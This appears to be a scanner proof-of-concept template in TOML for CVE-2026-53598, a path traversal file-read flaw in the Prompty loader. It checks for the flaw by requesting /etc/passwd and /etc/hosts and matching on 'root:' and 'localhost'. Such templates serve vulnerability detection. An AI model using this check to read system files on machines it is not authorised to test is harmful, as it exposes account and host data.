[info]
author = "ave"
description = "验证 Prompty 加载器对 ${file:} 引用的路径遍历漏洞，通过构造恶意 .prompty 文件读取本地敏感文件"
id = "POC-AVE-2026-0416"
name = "CVE-2026-53598 Prompty 任意文件读取 PoC"
severity = "high"
tags = ["ave-2026-0416"]
vuln_id = [
    "CVE-2026-53598",
    "AVE-2026-0416",
]

[poc]
logic = "all"

[[poc.requests]]
path = "/etc/passwd"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests]]
path = "/etc/hosts"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["localhost"]
